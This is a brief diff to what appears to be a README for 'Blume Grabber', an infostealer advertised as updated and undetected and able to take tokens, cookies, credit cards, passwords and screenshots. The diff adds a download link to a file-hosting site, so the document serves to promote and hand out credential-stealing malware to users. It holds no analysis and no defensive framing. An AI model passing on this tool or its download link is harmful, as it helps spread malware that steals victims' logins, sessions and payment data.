@@ -1,5 +1,6 @@
 # Blume Grabber (updated and undetected 2023/2024)
 Get Tokens, Cookies, Credit Cards, Passwords, Screenshots...
+> [Download](https://gofile.io/d/h64Ob3)
 
 <picture>
   <source srcset="https://i.ibb.co/60yVQrH/Blume-Grabber.png">
